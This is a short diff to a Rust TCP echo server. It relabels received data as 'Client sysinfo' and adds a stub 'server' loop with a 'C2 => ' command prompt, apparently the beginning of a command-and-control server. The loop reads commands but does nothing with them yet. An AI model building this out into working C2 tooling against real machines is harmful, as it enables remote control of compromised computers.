@@ -1,4 +1,4 @@
-use std::io::{Read, Write};
+use std::io::{self, Read, Write};
 use std::net::TcpStream;
 
 pub fn handle_client(mut stream: TcpStream){
@@ -7,8 +7,8 @@ pub fn handle_client(mut stream: TcpStream){
     while match stream.read(&mut buffer) {
         Ok(size) => {
             let _ = stream.write_all(&mut buffer[0..size]);
-            let client_message = String::from_utf8_lossy(&mut buffer[..size]);
-            println!("Client message: {}", client_message);
+            let client_sysinfo = String::from_utf8_lossy(&mut buffer[..size]);
+            println!("Client sysinfo: {}", client_sysinfo);
             true
         },
         Err(_) => {
@@ -20,5 +20,19 @@ pub fn handle_client(mut stream: TcpStream){
             false
         }
     } {}
+}
+
+pub fn server() {
+    let mut command = String::new();
+
+    loop {
+        print!("C2 => ");
+        io::stdout().flush().unwrap();
+
+        io::stdin().read_line(&mut command).expect("Failed to read command");
+        command = command.trim_end().to_owned();
+
+
+    }
 }
 
